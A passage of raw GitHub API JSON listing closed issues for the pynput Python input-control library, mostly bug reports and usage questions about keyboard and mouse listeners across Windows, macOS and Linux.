\"on_press\"\r\n\r\nI.e.\r\nPressing and releasing [control-left], and then pressing 'a' key\r\n- receive '\\x01' as key in 'on_press' callback\r\n- write 'a' in notepad\r\n- receive 'a' as key in 'on_release' callback\r\n\r\nNext pressig 'a' key works as expected (receive 'a' key in 'on_press')\r\n\r\nEnviroment: pynput 1.6 + python3.7 + windows 10 + spanish keyboard\r\n\r\n\r\nAnother question: If I press control+a combination, I receive '\\x01'. How can I get 'a' from '\\x01' or  '\\x01' from 'a'?\r\nNote that crtl+alt+a => receive '<65>' instead of '\\x01' in 'on_press' callback\r\n\r\nThanks for all\r\n\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/201", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/201/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/201/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/201/events", "html_url": "https://github.com/moses-palmer/pynput/issues/201", "id": 538136151, "node_id": "MDU6SXNzdWU1MzgxMzYxNTE=", "number": 201, "title": "Media keys recorded on pressing regular characters", "user": {"login": "pedrorrivero", "id": 52980156, "node_id": "MDQ6VXNlcjUyOTgwMTU2", "avatar_url": "https://avatars0.githubusercontent.com/u/52980156?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pedrorrivero", "html_url": "https://github.com/pedrorrivero", "followers_url": "https://api.github.com/users/pedrorrivero/followers", "following_url": "https://api.github.com/users/pedrorrivero/following{/other_user}", "gists_url": "https://api.github.com/users/pedrorrivero/gists{/gist_id}", "starred_url": "https://api.github.com/users/pedrorrivero/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pedrorrivero/subscriptions", "organizations_url": "https://api.github.com/users/pedrorrivero/orgs", "repos_url": "https://api.github.com/users/pedrorrivero/repos", "events_url": "https://api.github.com/users/pedrorrivero/events{/privacy}", "received_events_url": "https://api.github.com/users/pedrorrivero/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 26, "created_at": "2019-12-16T01:03:53Z", "updated_at": "2020-02-28T08:02:07Z", "closed_at": "2020-02-28T08:02:07Z", "author_association": "NONE", "active_lock_reason": null, "body": "In the new MacBook Pro with touchbar (european spanish keyboard) whenever letter `a` is pressed, the actual recorded key is Key.media_volume_up. This is not the only case:\r\n\r\n- `a` : Key.media_volume_up\r\n- `s` : Key.media_volume_down\r\n- `t` : Key.media_next\r\n- `y` : Key.media_play_pause\r\n- `x` : Key.media_volume_mute\r\n- `1` : Key.media_previous", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/200", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/200/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/200/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/200/events", "html_url": "https://github.com/moses-palmer/pynput/issues/200", "id": 536962493, "node_id": "MDU6SXNzdWU1MzY5NjI0OTM=", "number": 200, "title": "'GlobalHotKeys' object has no attribute '_event_filter' (Windows 7 x64)", "user": {"login": "d-01", "id": 45796739, "node_id": "MDQ6VXNlcjQ1Nzk2NzM5", "avatar_url": "https://avatars1.githubusercontent.com/u/45796739?v=4", "gravatar_id": "", "url": "https://api.github.com/users/d-01", "html_url": "https://github.com/d-01", "followers_url": "https://api.github.com/users/d-01/followers", "following_url": "https://api.github.com/users/d-01/following{/other_user}", "gists_url": "https://api.github.com/users/d-01/gists{/gist_id}", "starred_url": "https://api.github.com/users/d-01/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/d-01/subscriptions", "organizations_url": "https://api.github.com/users/d-01/orgs", "repos_url": "https://api.github.com/users/d-01/repos", "events_url": "https://api.github.com/users/d-01/events{/privacy}", "received_events_url": "https://api.github.com/users/d-01/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-12-12T12:57:36Z", "updated_at": "2019-12-19T20:08:00Z", "closed_at": "2019-12-19T20:07:59Z", "author_association": "NONE", "active_lock_reason": null, "body": "pynput version: 1.6.0\r\nPython 3.7.5 (x32)\r\nWindows 7 (x64)\r\n\r\nExample taken from docs unmodified (https://pynput.readthedocs.io/en/latest/keyboard.html#global-hotkeys)\r\n\r\n```python\r\nfrom pynput import keyboard\r\n\r\ndef on_activate_h():\r\n    print('<ctrl>+<alt>+h pressed')\r\n\r\ndef on_activate_i():\r\n    print('<ctrl>+<alt>+i pressed')\r\n\r\nwith keyboard.GlobalHotKeys({\r\n        '<ctrl>+<alt>+h': on_activate_h,\r\n        '<ctrl>+<alt>+i': on_activate_i}) as h:\r\n    h.join()\r\n```\r\n\r\nAfter script run any key press leads to an error:\r\n\r\n```\r\nUnhandled exception in listener callback\r\nTraceback (most recent call last):\r\n  File \"C:\\python\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 162, in inner\r\n    return f(self, *args, **kwargs)\r\n  File \"C:\\python\\lib\\site-packages\\pynput\\_util\\win32.py\", line 382, in _handler\r\n    converted = self._convert(code, msg, lpdata)\r\n  File \"C:\\python\\lib\\site-packages\\pynput\\keyboard\\_win32.py\", line 244, in _convert\r\n    if self._event_filter(msg, data) is False:\r\nAttributeError: 'GlobalHotKeys' object has no attribute '_event_filter'\r\nTraceback (most recent call last):\r\n  File \"demo-pynput-test.py\", line 13, in <module>\r\n    h.join()\r\n  File \"C:\\python\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 210, in join\r\n    six.reraise(exc_type, exc_value, exc_traceback)\r\n  File \"C:\\python\\lib\\site-packages\\six.py\", line 692, in reraise\r\n    raise value.with_traceback(tb)\r\n  File \"C:\\python\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 162, in inner\r\n    return f(self, *args, **kwargs)\r\n  File \"C:\\python\\lib\\site-packages\\pynput\\_util\\win32.py\", line 382, in _handler\r\n    converted = self._convert(code, msg, lpdata)\r\n  File \"C:\\python\\lib\\site-packages\\pynput\\keyboard\\_win32.py\", line 244, in _convert\r\n    if self._event_filter(msg, data) is False:\r\nAttributeError: 'GlobalHotKeys' object has no attribute '_event_filter'\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/198", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/198/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/198/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/198/events", "html_url": "https://github.com/moses-palmer/pynput/issues/198", "id": 533601841, "node_id": "MDU6SXNzdWU1MzM2MDE4NDE=", "number": 198, "title": "I'm getting \"ValueError: {'is_media': True}\" when trying to import pynput", "user": {"login": "ah3243", "id": 20662655, "node_id": "MDQ6VXNlcjIwNjYyNjU1", "avatar_url": "https://avatars2.githubusercontent.com/u/20662655?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ah3243", "html_url": "https://github.com/ah3243", "followers_url": "https://api.github.com/users/ah3243/followers", "following_url": "https://api.github.com/users/ah3243/following{/other_user}", "gists_url": "https://api.github.com/users/ah3243/gists{/gist_id}", "starred_url": "https://api.github.com/users/ah3243/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ah3243/subscriptions", "organizations_url": "https://api.github.com/users/ah3243/orgs", "repos_url": "https://api.github.com/users/ah3243/repos", "events_url": "https://api.github.com/users/ah3243/events{/privacy}", "received_events_url": "https://api.github.com/users/ah3243/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-12-05T21:12:22Z", "updated_at": "2019-12-06T12:50:24Z", "closed_at": "2019-12-06T12:50:24Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm getting this value error after installing through pip on a clean conda environment(i've tried python 3.5, 3.6 and 3.7 all on OSX 10.15. \r\n\r\nIt was working before so i built my script around it then for some reason started throwing up this error, which was frustrating. Any help you could give me would be amazing. Here's the full stacktrace. \r\n\r\n>>> import pynput\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/Users/alberthiggins/anaconda3/envs/newMouseTest/lib/python3.5/site-packages/pynput/__init__.py\", line 40, in <module>\r\n    from . import keyboard\r\n  File \"/Users/alberthiggins/anaconda3/envs/newMouseTest/lib/python3.5/site-packages/pynput/keyboard/__init__.py\", line 40, in <module>\r\n    from ._darwin import KeyCode, Key, Controller, Listener\r\n  File \"/Users/alberthiggins/anaconda3/envs/newMouseTest/lib/python3.5/site-packages/pynput/keyboard/_darwin.py\", line 115, in <module>\r\n    class Key(enum.Enum):\r\n  File \"/Users/alberthiggins/anaconda3/envs/newMouseTest/lib/python3.5/site-packages/pynput/keyboard/_darwin.py\", line 166, in Key\r\n    media_play_pause = KeyCode.from_vk(NX_KEYTYPE_PLAY, is_media=True)\r\n  File \"/Users/alberthiggins/anaconda3/envs/newMouseTest/lib/python3.5/site-packages/pynput/keyboard/_base.py\", line 131, in from_vk\r\n    return cls(vk=vk, **kwargs)\r\n  File \"/Users/alberthiggins/anaconda3/envs/newMouseTest/lib/python3.5/site-packages/pynput/keyboard/_base.py\", line 62, in __init__\r\n    raise ValueError(kwargs)\r\nValueError: {'is_media': True}", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/197", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/197/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/197/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/197/events", "html_url": "https://github.com/moses-palmer/pynput/issues/197", "id": 532682123, "node_id": "MDU6SXNzdWU1MzI2ODIxMjM=", "number": 197, "title": "break cycle by key", "user": {"login": "tierline1", "id": 25299783, "node_id": "MDQ6VXNlcjI1Mjk5Nzgz", "avatar_url": "https://avatars3.githubusercontent.com/u/25299783?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tierline1", "html_url": "https://github.com/tierline1", "followers_url": "https://api.github.com/users/tierline1/followers", "following_url": "https://api.github.com/users/tierline1/following{/other_user}", "gists_url": "https://api.github.com/users/tierline1/gists{/gist_id}", "starred_url": "https://api.github.com/users/tierline1/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tierline1/subscriptions", "organizations_url": "https://api.github.com/users/tierline1/orgs", "repos_url": "https://api.github.com/users/tierline1/repos", "events_url": "https://api.github.com/users/tierline1/events{/privacy}", "received_events_url": "https://api.github.com/users/tierline1/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-12-04T13:23:08Z", "updated_at": "2019-12-05T08:33:29Z", "closed_at": "2019-12-04T13:42:39Z", "author_association": "NONE", "active_lock_reason": null, "body": "i want to break cycle by pressing page_down like this, but no effect, help me pls correct implementation\r\n\r\n```\r\nfrom pynput.keyboard import Key, Listener\r\nimport time\r\n\r\nreset = 0\r\n\r\ndef on_press(key):\r\n    global reset    \r\n    if key == Key.page_up:\r\n        print('start proc')\r\n        proc()\r\n    if key == Key.page_down:\r\n        reset = 1\r\n    if key == Key.esc:\r\n        # Stop listener\r\n        return False\r\n\r\ndef proc():\r\n    while true:\r\n        time.sleep(2)\r\n        print('inside proc..')\r\n        if reset == 1:\r\n            break\r\n\r\nwith Listener(on_press=on_press) as listener:\r\n    listener.join()\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/195", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/195/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/195/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/195/events", "html_url": "https://github.com/moses-palmer/pynput/issues/195", "id": 522330315, "node_id": "MDU6SXNzdWU1MjIzMzAzMTU=", "number": 195, "title": "MacOS keyboard listner error", "user": {"login": "myjulo", "id": 6639444, "node_id": "MDQ6VXNlcjY2Mzk0NDQ=", "avatar_url": "https://avatars0.githubusercontent.com/u/6639444?v=4", "gravatar_id": "", "url": "https://api.github.com/users/myjulo", "html_url": "https://github.com/myjulo", "followers_url": "https://api.github.com/users/myjulo/followers", "following_url": "https://api.github.com/users/myjulo/following{/other_user}", "gists_url": "https://api.github.com/users/myjulo/gists{/gist_id}", "starred_url": "https://api.github.com/users/myjulo/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/myjulo/subscriptions", "organizations_url": "https://api.github.com/users/myjulo/orgs", "repos_url": "https://api.github.com/users/myjulo/repos", "events_url": "https://api.github.com/users/myjulo/events{/privacy}", "received_events_url": "https://api.github.com/users/myjulo/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-11-13T16:24:57Z", "updated_at": "2019-11-21T11:19:58Z", "closed_at": "2019-11-21T11:19:58Z", "author_association": "NONE", "active_lock_reason": null, "body": "I've seen a couple of these issues posted here, but unfortunately they did not apply to my situation.\r\n\r\nI have a 2099 Mac Pro/OSX El Capitan. I'm trying to run a code called \"RTBox_light_demo.py\" that can be downloaded from [this site](https://lobes.osu.edu/rt-box.php). It is used to communicate with a response box that is connected with USB, which can be used in psychophysics experiments (more details on the website linked before). I'm running the code within the PsychoPy app that is a python based app installed within the Anaconda environment.\r\n\r\nIt gives me the following error:\r\n\r\n    Traceback (most recent call last):\r\n    File \"/Users/user/Downloads/RTBox_python_000/RTBox_light_demo.py\", line 15, in <module>\r\n        import RTBox\r\n    File \"/Users/user/Downloads/RTBox_python_000/RTBox.py\", line 14, in <module>\r\n        from pynput import keyboard\r\n    File \"/Users/user/anaconda3/envs/psypy3/lib/python3.6/site-packages/pynput/__init__.py\", line 40, in <module>\r\n        from . import keyboard\r\n    File \"/Users/user/anaconda3/envs/psypy3/lib/python3.6/site-packages/pynput/keyboard/__init__.py\", line 40, in <module>\r\n        from ._darwin import KeyCode, Key, Controller, Listener\r\n    File \"/Users/user/anaconda3/envs/psypy3/lib/python3.6/site-packages/pynput/keyboard/_darwin.py\", line 144, in <module>\r\n        class Listener(ListenerMixin, _base.Listener):\r\n    File \"/Users/user/anaconda3/envs/psypy3/lib/python3.6/site-packages/pynput/keyboard/_darwin.py\", line 148, in Listener\r\n        Quartz.CGEventMaskBit(Quartz.kCGEventKeyUp) |\r\n    File \"/Users/user/anaconda3/envs/psypy3/lib/python3.6/site-packages/objc/_lazyimport.py\", line 181, in __getattr__\r\n        raise AttributeError(name)\r\n    AttributeError: CGEventMaskBit\r\n\r\n\r\nI haven't had this error on my 2017 Macbook Pro/OSX Mojave. \r\n\r\nAny ideas on how to approach this error? Thank you!\r\n\r\n**Edit**:\r\nI've done some more testing and it comes down to that in the \"RT_light_demo.py\" first states:\r\n\r\n    from psychopy import visual, event, core\r\n\r\nAnd then states:\r\n\r\n    import RTBox\r\n\r\nIf I remove `visual` from the first line, `from pynput import keyboard`does not give an error, but I obviously get other errors further down the script. If I import `visual` after I import `RTBox`, The script gets stuck at presenting the first visual presentation screen.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/194", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/194/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/194/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/194/events", "html_url": "https://github.com/moses-palmer/pynput/issues/194", "id": 520683043, "node_id": "MDU6SXNzdWU1MjA2ODMwNDM=", "number": 194, "title": "Is there any way to simulate inputs in a web browser?", "user": {"login": "FrostWolf1", "id": 44281625, "node_id": "MDQ6VXNlcjQ0MjgxNjI1", "avatar_url": "https://avatars3.githubusercontent.com/u/44281625?v=4", "gravatar_id": "", "url": "https://api.github.com/users/FrostWolf1", "html_url": "https://github.com/FrostWolf1", "followers_url": "https://api.github.com/users/FrostWolf1/followers", "following_url": "https://api.github.com/users/FrostWolf1/following{/other_user}", "gists_url": "https://api.github.com/users/FrostWolf1/gists{/gist_id}", "starred_url": "https://api.github.com/users/FrostWolf1/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/FrostWolf1/subscriptions", "organizations_url": "https://api.github.com/users/FrostWolf1/orgs", "repos_url": "https://api.github.com/users/FrostWolf1/repos", "events_url": "https://api.github.com/users/FrostWolf1/events{/privacy}", "received_events_url": "https://api.github.com/users/FrostWolf1/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-11-11T00:27:42Z", "updated_at": "2019-11-22T13:48:48Z", "closed_at": "2019-11-22T13:48:48Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am building a program that will interact with google chrome through pynput, as I am unable to use selenium. Unfortunately, when I try to interact with chrome by pressing enter, the enter input is instead done in the IDLE environment. Is there a way to have the input occur in chrome instead.\r\n\r\nI will attach my code here, but with the link blanked out.\r\n\r\nimport sys\r\nimport time\r\nimport webbrowser\r\nfrom pynput.keyboard import Key, Controller\r\n\r\nsys.path.insert(0, 'C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application')\r\nchromepath = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'\r\nurl = '----------------------------'\r\n\r\nkeyboard = Controller()\r\n\r\nwebbrowser.get(chromepath).open(url)\r\n\r\ntime.sleep(4)\r\n\r\nkeyboard.press(Key.enter)\r\nkeyboard.release(Key.enter)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/193", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/193/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/193/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/193/events", "html_url": "https://github.com/moses-palmer/pynput/issues/193", "id": 520230724, "node_id": "MDU6SXNzdWU1MjAyMzA3MjQ=", "number": 193, "title": "No cyrillic keyboard input and typing for Linux", "user": {"login": "Maboroshy", "id": 19194063, "node_id": "MDQ6VXNlcjE5MTk0MDYz", "avatar_url": "https://avatars0.githubusercontent.com/u/19194063?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Maboroshy", "html_url": "https://github.com/Maboroshy", "followers_url": "https://api.github.com/users/Maboroshy/followers", "following_url": "https://api.github.com/users/Maboroshy/following{/other_user}", "gists_url": "https://api.github.com/users/Maboroshy/gists{/gist_id}", "starred_url": "https://api.github.com/users/Maboroshy/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Maboroshy/subscriptions", "organizations_url": "https://api.github.com/users/Maboroshy/orgs", "repos_url": "https://api.github.com/users/Maboroshy/repos", "events_url": "https://api.github.com/users/Maboroshy/events{/privacy}", "received_events_url": "https://api.github.com/users/Maboroshy/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2019-11-08T20:58:12Z", "updated_at": "2020-01-11T21:05:43Z", "closed_at": "2020-01-11T21:05:43Z", "author_association": "NONE", "active_lock_reason": null, "body": "I use Manjaro Linux with Plasma DE and X.org Server 1.20.5. There are US English and Russian keyboard layouts on my system.\r\n\r\npynput work ok with US English but with Russian:\r\n- input is recognized as a corresponding US English layout keys: `q` instead of `\u0439` which is on the same key;\r\n- `pynput.keyboard.Controller().type('\u0430\u0431\u0432')` does nothing\r\n\r\n<details>\r\n  <summary>xev output for `\u0430\u0431\u0432` looks ok...</summary>\r\nKeyPress event, serial 40, synthetic NO, window 0x6600001,\r\n    root 0x6ce, subw 0x0, time 1433257, (-446,410), root:(472,447),\r\n    state 0x2000, keycode 41 (keysym 0x6c1, Cyrillic_a), same_screen YES,\r\n    XLookupString gives 2 bytes: (d0 b0) \"\u0430\"\r\n    XmbLookupString gives 2 bytes: (d0 b0) \"\u0430\"\r\n    XFilterEvent returns: False\r\n\r\nKeyRelease event, serial 40, synthetic NO, window 0x6600001,\r\n    root 0x6ce, subw 0x0, time 1433335, (-446,410), root:(472,447),\r\n    state 0x2000, keycode 41 (keysym 0x6c1, Cyrillic_a), same_screen YES,\r\n    XLookupString gives 2 bytes: (d0 b0) \"\u0430\"\r\n    XFilterEvent returns: False\r\n\r\nKeyPress event, serial 40, synthetic NO, window 0x6600001,\r\n    root 0x6ce, subw 0x0, time 1433713, (-446,410), root:(472,447),\r\n    state 0x2000, keycode 59 (keysym 0x6c2, Cyrillic_be), same_screen YES,\r\n    XLookupString gives 2 bytes: (d0 b1) \"\u0431\"\r\n    XmbLookupString gives 2 bytes: (d0 b1) \"\u0431\"\r\n    XFilterEvent returns: False\r\n\r\nKeyRelease event, serial 40, synthetic NO, window 0x6600001,\r\n    root 0x6ce, subw 0x0, time 1433793, (-446,410), root:(472,447),\r\n    state 0x2000, keycode 59 (keysym 0x6c2, Cyrillic_be), same_screen YES,\r\n    XLookupString gives 2 bytes: (d0 b1) \"\u0431\"\r\n    XFilterEvent returns: False\r\n\r\nKeyPress event, serial 40, synthetic NO, window 0x6600001,\r\n    root 0x6ce, subw 0x0, time 1434147, (-446,410), root:(472,447),\r\n    state 0x2000, keycode 40 (keysym 0x6d7, Cyrillic_ve), same_screen YES,\r\n    XLookupString gives 2 bytes: (d0 b2) \"\u0432\"\r\n    XmbLookupString gives 2 bytes: (d0 b2) \"\u0432\"\r\n    XFilterEvent returns: False\r\n\r\nKeyRelease event, serial 40, synthetic NO, window 0x6600001,\r\n    root 0x6ce, subw 0x0, time 1434227, (-446,410), root:(472,447),\r\n    state 0x2000, keycode 40 (keysym 0x6d7, Cyrillic_ve), same_screen YES,\r\n    XLookupString gives 2 bytes: (d0 b2) \"\u0432\"\r\n    XFilterEvent returns: False\r\n</details>", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/192", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/192/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/192/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/192/events", "html_url": "https://github.com/moses-palmer/pynput/issues/192", "id": 517980238, "node_id": "MDU6SXNzdWU1MTc5ODAyMzg=", "number": 192, "title": "How to define a class for listeners?", "user": {"login": "joaomamede", "id": 46799914, "node_id": "MDQ6VXNlcjQ2Nzk5OTE0", "avatar_url": "https://avatars3.githubusercontent.com/u/46799914?v=4", "gravatar_id": "", "url": "https://api.github.com/users/joaomamede", "html_url": "https://github.com/joaomamede", "followers_url": "https://api.github.com/users/joaomamede/followers", "following_url": "https://api.github.com/users/joaomamede/following{/other_user}", "gists_url": "https://api.github.com/users/joaomamede/gists{/gist_id}", "starred_url": "https://api.github.com/users/joaomamede/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/joaomamede/subscriptions", "organizations_url": "https://api.github.com/users/joaomamede/orgs", "repos_url": "https://api.github.com/users/joaomamede/repos", "events_url": "https://api.github.com/users/joaomamede/events{/privacy}", "received_events_url": "https://api.github.com/users/joaomamede/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2019-11-05T19:29:52Z", "updated_at": "2019-11-05T20:53:27Z", "closed_at": "2019-11-05T20:11:41Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, Thanks for pynput, it's great!\r\n\r\nI am trying to create an object that I can call to basically get the position of the mouse when clicked.\r\n\r\n```\r\nclass get_position(mouse.Listener):\r\n    def __init__(self):\r\n        mouse.Listener.__init__(self)\r\n\r\n    def on_move(x, y):\r\n        pass\r\n\r\n    def on_click(x, y, button, pressed):\r\n        print('{0} at {1}'.format(\r\n            'Pressed' if pressed else 'Released',\r\n            (x, y)))\r\n        \r\n        if not pressed:\r\n            # Stop listener\r\n            return False\r\n            self.value = (x,y)\r\n\r\n    def on_scroll(x, y, dx, dy):\r\n       pass\r\n\r\n```\r\n\r\nif I start say:\r\n\r\na = get_position()\r\n\r\nit does get created, \r\nbut when I go something like\r\n\r\na.join() \r\nit says it was not initialized?\r\n\r\ncalling it like this would save me a lot of programming time. \r\nCan anyone point me to how to do this?\r\n\r\nThanks.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/191", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/191/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/191/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/191/events", "html_url": "https://github.com/moses-palmer/pynput/issues/191", "id": 514872193, "node_id": "MDU6SXNzdWU1MTQ4NzIxOTM=", "number": 191, "title": "Getting error on linux server", "user": {"login": "yogeshwar607", "id": 10059011, "node_id": "MDQ6VXNlcjEwMDU5MDEx", "avatar_url": "https://avatars2.githubusercontent.com/u/10059011?v=4", "gravatar_id": "", "url": "https://api.github.com/users/yogeshwar607", "html_url": "https://github.com/yogeshwar607", "followers_url": "https://api.github.com/users/yogeshwar607/followers", "following_url": "https://api.github.com/users/yogeshwar607/following{/other_user}", "gists_url": "https://api.github.com/users/yogeshwar607/gists{/gist_id}", "starred_url": "https://api.github.com/users/yogeshwar607/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/yogeshwar607/subscriptions", "organizations_url": "https://api.github.com/users/yogeshwar607/orgs", "repos_url": "https://api.github.com/users/yogeshwar607/repos", "events_url": "https://api.github.com/users/yogeshwar607/events{/privacy}", "received_events_url": "https://api.github.com/users/yogeshwar607/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-10-30T17:59:54Z", "updated_at": "2019-11-05T20:14:18Z", "closed_at": "2019-11-05T20:14:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "Getting below error on linux server , \r\n\r\nAny guidelines , how to run pynput on aws linux server , basically how to run x server & what to set in  DISPLAY variable \r\n\r\n\r\n`Traceback (most recent call last):\r\n  File \"./demo.py\", line 10, in <module>\r\n    from pynput.keyboard import Key, Controller\r\n  File \"/usr/local/lib/python3.8/site-packages/pynput/__init__.py\", line 40, in <module>\r\n    from . import keyboard\r\n  File \"/usr/local/lib/python3.8/site-packages/pynput/keyboard/__init__.py\", line 49, in <module>\r\n    from ._xorg import KeyCode, Key, Controller, Listener\r\n  File \"/usr/local/lib/python3.8/site-packages/pynput/keyboard/_xorg.py\", line 39, in <module>\r\n    from pynput._util.xorg import (\r\n  File \"/usr/local/lib/python3.8/site-packages/pynput/_util/xorg.py\", line 40, in <module>\r\n    _check()\r\n  File \"/usr/local/lib/python3.8/site-packages/pynput/_util/xorg.py\", line 38, in _check\r\n    display = Xlib.display.Display()\r\n  File \"/usr/local/lib/python3.8/site-packages/Xlib/display.py\", line 89, in __init__\r\n    self.display = _BaseDisplay(display)\r\n  File \"/usr/local/lib/python3.8/site-packages/Xlib/display.py\", line 71, in __init__\r\n    protocol_display.Display.__init__(self, *args, **keys)\r\n  File \"/usr/local/lib/python3.8/site-packages/Xlib/protocol/display.py\", line 84, in __init__\r\n    name, protocol, host, displayno, screenno = connect.get_display(display)\r\n  File \"/usr/local/lib/python3.8/site-packages/Xlib/support/connect.py\", line 73, in get_display\r\n    return mod.get_display(display)\r\n  File \"/usr/local/lib/python3.8/site-packages/Xlib/support/unix_connect.py\", line 76, in get_display\r\n    raise error.DisplayNameError(display)\r\nXlib.error.DisplayNameError: Bad display name \"\"`", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/190", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/190/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/190/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/190/events", "html_url": "https://github.com/moses-palmer/pynput/issues/190", "id": 513260551, "node_id": "MDU6SXNzdWU1MTMyNjA1NTE=", "number": 190, "title": "I am not able to simulate media keys", "user": {"login": "ShivamJoker", "id": 23727670, "node_id": "MDQ6VXNlcjIzNzI3Njcw", "avatar_url": "https://avatars2.githubusercontent.com/u/23727670?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ShivamJoker", "html_url": "https://github.com/ShivamJoker", "followers_url": "https://api.github.com/users/ShivamJoker/followers", "following_url": "https://api.github.com/users/ShivamJoker/following{/other_user}", "gists_url": "https://api.github.com/users/ShivamJoker/gists{/gist_id}", "starred_url": "https://api.github.com/users/ShivamJoker/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ShivamJoker/subscriptions", "organizations_url": "https://api.github.com/users/ShivamJoker/orgs", "repos_url": "https://api.github.com/users/ShivamJoker/repos", "events_url": "https://api.github.com/users/ShivamJoker/events{/privacy}", "received_events_url": "https://api.github.com/users/ShivamJoker/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], 